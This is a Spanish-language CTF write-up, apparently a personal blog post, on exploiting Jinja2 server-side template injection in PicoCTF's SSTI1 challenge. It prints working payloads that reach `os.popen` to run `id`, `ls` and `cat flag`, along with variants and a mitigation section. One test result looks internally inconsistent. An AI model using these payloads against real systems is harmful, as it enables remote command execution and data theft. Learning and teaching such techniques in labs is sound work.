---
title: "SSTI1 PicoCTF: Mi Primera Template Injection"
date: 2025-06-13
image: /images/blogs/ssti-picoctf.jpg
lastmod: 2025-06-13
description: "Análisis paso a paso de cómo descubrí y exploté mi primera vulnerabilidad Server-Side Template Injection"
tags: ["SSTI", "PicoCTF", "Web Exploitation", "Jinja2"]
categories: ["CTF Writeups", "Web Exploitation"]
author: "Emilinho"
draft: false
---

# SSTI1 PicoCTF: Mi Primera Template Injection

## 🎯 El Reto que Cambió Mi Perspectiva

Cuando me enfrenté por primera vez a SSTI1 en PicoCTF, no tenía idea de que estaba a punto de descubrir una de las vulnerabilidades más elegantes y peligrosas del mundo web. Este writeup documenta mi proceso completo de resolución.

| Campo | Detalle |
|---|---|
| **Plataforma** | PicoCTF |
| **Categoría** | Web Exploitation |
| **Puntos** | 400 |
| **Dificultad** | ⭐⭐⭐ |
| **Herramientas** | Browser, Burp Suite, PortSwigger |
| **Tiempo invertido** | 3 horas |
| **Fecha** | 15 de enero, 2024 |

## 🔍 Reconocimiento Inicial

Lo primero que hice fue visitar la aplicación web. A simple vista, parecía un formulario básico que procesaba input del usuario. El hint mencionaba "Server Side Template Injection", así que sabía hacia dónde dirigir mi investigación.

### 🌐 Análisis de la Aplicación Web

- Una página web simple con un formulario de entrada
- Un campo de texto donde podía ingresar contenido
- La salida se mostraba dinámicamente en la página
- No había filtros obvios en el frontend

### 📚 Investigación Previa

Antes de lanzarme a probar payloads al azar, consulté [PortSwigger SSTI Guide](https://portswigger.net/web-security/server-side-template-injection).

> **💡 ¿Qué es Server-Side Template Injection?**
> SSTI ocurre cuando user input es insertado directamente en templates del lado del servidor, permitiendo a atacantes ejecutar código en el contexto del servidor.

## 🧪 Proceso de Testing

### Paso 1: Identificando la Vulnerabilidad
```bash
# Primer intento - Testing básico
{{7*7}}
# Resultado: {{7*7}} (sin procesar)

# Segundo intento
${7*7}
# Resultado: ${7*7} (sin procesar)

# Tercer intento - Jinja2 syntax
${{7*7}}
# Resultado: 49 ✅
```

> **🚨 El Momento Eureka:** Cuando inserté `${{7*7}}` y vi que el servidor devolvió `49`, supe que había encontrado la vulnerabilidad.

### Paso 2: Identificando el Template Engine
```bash
${{7*'7'}}
# Resultado: 7777777
```

Este resultado indica **Jinja2**, el motor de plantillas popular en Python/Flask.

### Paso 3: Explorando el Contexto
```python
${{config}}          # Información de configuración de Flask
${{request}}         # Objeto request disponible
${{request.__class__}} # <class 'werkzeug.local.LocalProxy'>
```

## 🛠️ Desarrollo del Exploit

**Recursos consultados:**
- [OnSecurity SSTI with Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
- [PayloadsAllTheThings - SSTI](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

### Paso 4: Verificando RCE
```python
${{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Resultado: uid=0(root) gid=0(root) groups=0(root)
```

### Paso 5: Explorando el Sistema
```python
${{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
# Resultado: __pycache__ app.py flag requirements.txt
```

### Paso 6: Obteniendo el Flag
```python
${{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
# Resultado: picoCTF{s*****_*****_*****_*****}
```

## 🎉 ¡Flag Obtenido!

La sensación fue indescriptible: triunfo técnico, comprensión profunda del attack vector, y respeto por la elegancia del exploit.

## 🧠 Análisis Técnico

### ¿Por qué Funcionó?

1. **Template Engine Vulnerable**: Jinja2 sin sandboxing
2. **Input Sin Sanitizar**: User input directo en el template
3. **Contexto Privilegiado**: Aplicación corriendo como root
4. **Objetos Peligrosos Disponibles**: `request`, `config` accesibles

### Anatomía del Payload
```python
${{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

- `request.application` → objeto aplicación Flask
- `__globals__` → variables globales del módulo
- `__builtins__` → funciones built-in de Python
- `__import__('os')` → importa el módulo os dinámicamente
- `.popen('cat flag')` → ejecuta el comando en el sistema
- `.read()` → retorna la salida como string

### Variaciones del Payload
```python
${{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
${{lipsum.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

## 🛡️ Mitigación y Defensa

### ✅ Defensas Efectivas
```python
# 1. Sandboxed Environment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# 2. Validación estricta (whitelist)
def validate_input(user_input):
    if not re.match(r'^[a-zA-Z0-9\s]+$', user_input):
        raise ValueError("Input inválido")
    return user_input

# 3. Principio de menor privilegio
# No ejecutar la aplicación como root
```

## 🎯 Lecciones Aprendidas

1. **La Investigación es Clave** — Entender antes de explotar ahorra horas de trial-and-error
2. **Metodología Sistemática** — Identificar → confirmar → explorar → explotar
3. **Entender el Contexto** — Saber por qué existe la vulnerabilidad ayuda en la defensa
4. **Documentar Todo** — Cada payload, resultado e hipótesis
5. **Pensar Como Defensor** — Attack y defense van de la mano

## 📊 Estadísticas

| Métrica | Valor |
|---|---|
| ⏱️ Tiempo total | 3 horas |
| 🔍 Investigación | 1 hora |
| 🧪 Testing | 1.5 horas |
| 📝 Documentación | 30 minutos |
| 🎯 Payloads probados | ~15 |
| ✅ Payloads exitosos | 4 |

## 📚 Recursos

- [PortSwigger SSTI Guide](https://portswigger.net/web-security/server-side-template-injection)
- [Jinja2 Documentation](https://jinja.palletsprojects.com/)
- [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)
- [TryHackMe SSTI Room](https://tryhackme.com/room/learnssti)

## 🔄 Próximos Pasos

- [ ] SSTI2 PicoCTF
- [ ] Template injection en Twig (PHP)
- [ ] SSTI en contextos blind
- [ ] Scanner SSTI personalizado

---

> ⚠️ **Recordatorio Ético:** Este conocimiento es para propósitos educativos, testing autorizado y CTF competitions. Nunca uses estas técnicas sin autorización explícita.

---

> *"La verdadera maestría en ciberseguridad no está en encontrar vulnerabilidades, sino en entender por qué existen y cómo prevenirlas."* — **Emilinho**
